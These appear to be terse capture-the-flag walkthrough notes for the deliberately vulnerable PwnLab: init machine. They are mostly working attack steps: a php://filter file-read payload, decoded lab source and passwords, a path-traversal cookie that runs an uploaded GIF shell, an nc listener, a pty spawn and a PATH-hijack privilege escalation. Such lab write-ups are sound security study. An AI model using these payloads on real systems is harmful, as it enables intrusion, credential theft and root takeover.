@@ -1,0 +1,198 @@
+nmap -sV -sC -sT -p- 10.X.X.X
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+nikto gives;
+
+index.php
+login.php
+config.php
+
++ /config.php: PHP Config file may contain database IDs and passwords.
++ /login.php: Admin login page/section found.
+
+[+]php://filter/convert.base64-encode/resource=index.php -> delete only php
+
+index |->
+PD9waHANCi8vTXVsdGlsaW5ndWFsLiBOb3QgaW1wbGVtZW50ZWQgeWV0Lg0KLy9zZXRjb29raWUoImxhbmciLCJlbi5sYW5nLnBocCIpOw0KaWYgKGlzc2V0KCRfQ09PS0lFWydsYW5nJ10pKQ0Kew0KCWluY2x1ZGUoImxhbmcvIi4kX0NPT0tJRVsnbGFuZyddKTsNCn0NCi8vIE5vdCBpbXBsZW1lbnRlZCB5ZXQuDQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5Qd25MYWIgSW50cmFuZXQgSW1hZ2UgSG9zdGluZzwvdGl0bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCjxjZW50ZXI+DQo8aW1nIHNyYz0iaW1hZ2VzL3B3bmxhYi5wbmciPjxiciAvPg0KWyA8YSBocmVmPSIvIj5Ib21lPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9bG9naW4iPkxvZ2luPC9hPiBdIFsgPGEgaHJlZj0iP3BhZ2U9dXBsb2FkIj5VcGxvYWQ8L2E+IF0NCjxoci8+PGJyLz4NCjw/cGhwDQoJaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKQ0KCXsNCgkJaW5jbHVkZSgkX0dFVFsncGFnZSddLiIucGhwIik7DQoJfQ0KCWVsc2UNCgl7DQoJCWVjaG8gIlVzZSB0aGlzIHNlcnZlciB0byB1cGxvYWQgYW5kIHNoYXJlIGltYWdlIGZpbGVzIGluc2lkZSB0aGUgaW50cmFuZXQiOw0KCX0NCj8+DQo8L2NlbnRlcj4NCjwvYm9keT4NCjwvaHRtbD4=
+
+base64 encode;
+
+<?php
+//Multilingual. Not implemented yet.
+//setcookie("lang","en.lang.php");
+if (isset($_COOKIE['lang']))
+{
+	include("lang/".$_COOKIE['lang']);
+}
+// Not implemented yet.
+?>
+<html>
+<head>
+<title>PwnLab Intranet Image Hosting</title>
+</head>
+<body>
+<center>
+<img src="images/pwnlab.png"><br />
+[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
+<hr/><br/>
+<?php
+	if (isset($_GET['page']))
+	{
+		include($_GET['page'].".php");
+	}
+	else
+	{
+		echo "Use this server to upload and share image files inside the intranet";
+	}
+?>
+</center>
+</body>
+</html>
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+
+login |->
+PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCnJlcXVpcmUoImNvbmZpZy5waHAiKTsNCiRteXNxbGkgPSBuZXcgbXlzcWxpKCRzZXJ2ZXIsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOw0KDQppZiAoaXNzZXQoJF9QT1NUWyd1c2VyJ10pIGFuZCBpc3NldCgkX1BPU1RbJ3Bhc3MnXSkpDQp7DQoJJGx1c2VyID0gJF9QT1NUWyd1c2VyJ107DQoJJGxwYXNzID0gYmFzZTY0X2VuY29kZSgkX1BPU1RbJ3Bhc3MnXSk7DQoNCgkkc3RtdCA9ICRteXNxbGktPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcj0/IEFORCBwYXNzPT8iKTsNCgkkc3RtdC0+YmluZF9wYXJhbSgnc3MnLCAkbHVzZXIsICRscGFzcyk7DQoNCgkkc3RtdC0+ZXhlY3V0ZSgpOw0KCSRzdG10LT5zdG9yZV9SZXN1bHQoKTsNCg0KCWlmICgkc3RtdC0+bnVtX3Jvd3MgPT0gMSkNCgl7DQoJCSRfU0VTU0lPTlsndXNlciddID0gJGx1c2VyOw0KCQloZWFkZXIoJ0xvY2F0aW9uOiA/cGFnZT11cGxvYWQnKTsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobyAiTG9naW4gZmFpbGVkLiI7DQoJfQ0KfQ0KZWxzZQ0Kew0KCT8+DQoJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0iUE9TVCI+DQoJPGxhYmVsPlVzZXJuYW1lOiA8L2xhYmVsPjxpbnB1dCBpZD0idXNlciIgdHlwZT0idGVzdCIgbmFtZT0idXNlciI+PGJyIC8+DQoJPGxhYmVsPlBhc3N3b3JkOiA8L2xhYmVsPjxpbnB1dCBpZD0icGFzcyIgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3MiPjxiciAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCgk8L2Zvcm0+DQoJPD9waHANCn0NCg==
+
+base64 encode;
+
+<?php
+session_start();
+require("config.php");
+$mysqli = new mysqli($server, $username, $password, $database);
+
+if (isset($_POST['user']) and isset($_POST['pass']))
+{
+	$luser = $_POST['user'];
+	$lpass = base64_encode($_POST['pass']);
+
+	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
+	$stmt->bind_param('ss', $luser, $lpass);
+
+	$stmt->execute();
+	$stmt->store_Result();
+
+	if ($stmt->num_rows == 1)
+	{
+		$_SESSION['user'] = $luser;
+		header('Location: ?page=upload');
+	}
+	else
+	{
+		echo "Login failed.";
+	}
+}
+else
+{
+	?>
+	<form action="" method="POST">
+	<label>Username: </label><input id="user" type="test" name="user"><br />
+	<label>Password: </label><input id="pass" type="password" name="pass"><br />
+	<input type="submit" name="submit" value="Login">
+	</form>
+	<?php
+}
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+config |->
+
+PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+
+
+base64 encode;
+
+<?php
+$server	  = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";
+?>
+
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ== | base64 encode -> JWzXuBJJNy
+| mike | U0lmZHNURW42SQ== | base64 encode -> SIfdsTEn6I
+| kane | aVN2NVltMkdSbw== | base64 encode -> iSv5Ym2GRo
+
+
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+nc -lvp 1234
+
+http://10.X.X.X/upload/3208fd203ca8fdfa13bc98a4832c1396.gif
+
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+
+Cookie: lang=/../upload/3208fd203ca8fdfa13bc98a4832c1396.gif
+
+
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py
+su
+
+
+
+kane;
+
+cd home / kane 
+cat msgmike
+strings msgmike
+
+
+
+echo '/bin/sh' > cat
+chmod +x cat
+export PATH=./:$PATH
+./msgmike
+
+
+/bin/echo %s >> /root/messages.txt
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+root; /bin/sh
+
+cat flag.txt
+
+
+.-=~=-.                                                                 .-=~=-.
+(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
+(_ ___)  _____                             _                            (_ ___)
+(__  _) /  __ \                           | |                           (__  _)
+( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
+(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
+(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
+(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
+( _ __)                     __/ |                                       ( _ __)
+(__  _)                    |___/                                        (__  _)
+(__  _)                                                                 (__  _)
+(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
+( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
+(__  _) this challenge.                                                 (__  _)
+(_ ___)                                                                 (_ ___)
+( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
+(__  _) reading it                                                      (__  _)
+(__  _)                                                                 (__  _)
+(__  _)                                             For sniferl4bs.com  (__  _)
+( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
+(__  _)                                                                 (__  _)
+(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
+`-._.-'                                                                 `-._.-'
+
+
+
+
+
